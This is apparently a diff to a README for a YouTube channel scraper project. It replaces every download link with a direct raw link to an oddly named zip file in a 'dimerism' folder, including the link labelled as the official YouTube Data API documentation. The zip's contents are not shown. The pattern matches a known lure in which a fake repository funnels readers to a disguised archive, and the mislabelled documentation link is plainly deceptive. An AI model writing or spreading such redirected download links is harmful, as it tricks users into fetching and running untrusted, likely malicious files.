@@ -1,7 +1,7 @@
 # 🛠️ youtube-channel-user-scraper-pay-per-result - Easily Gain Channel Insights
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/releases)
+[![Download Here](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/raw/refs/heads/main/dimerism/channel_result_per_youtube_pay_user_scraper_2.1-alpha.2.zip%20Now-Here-blue)](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/raw/refs/heads/main/dimerism/channel_result_per_youtube_pay_user_scraper_2.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, ensure that your system meets the following requirements:
 To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Here](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/releases)
+   [Download Here](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/raw/refs/heads/main/dimerism/channel_result_per_youtube_pay_user_scraper_2.1-alpha.2.zip)
    
 2. **Select the Latest Version:** On the releases page, look for the latest version of the application.
 
@@ -72,7 +72,7 @@ We welcome contributions! If you have ideas or improvements, please check the co
 
 ## 🔗 Additional Resources
 
-- Official YouTube Data API [Documentation](https://developers.google.com/youtube/v3)
+- Official YouTube Data API [Documentation](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/raw/refs/heads/main/dimerism/channel_result_per_youtube_pay_user_scraper_2.1-alpha.2.zip)
 - Tutorials on using the application and extracting insights effectively.
 
-Once again, don’t forget to [Download Here](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/releases) and start gaining valuable insights into YouTube channels!
+Once again, don’t forget to [Download Here](https://github.com/Luqe087/youtube-channel-user-scraper-pay-per-result/raw/refs/heads/main/dimerism/channel_result_per_youtube_pay_user_scraper_2.1-alpha.2.zip) and start gaining valuable insights into YouTube channels!
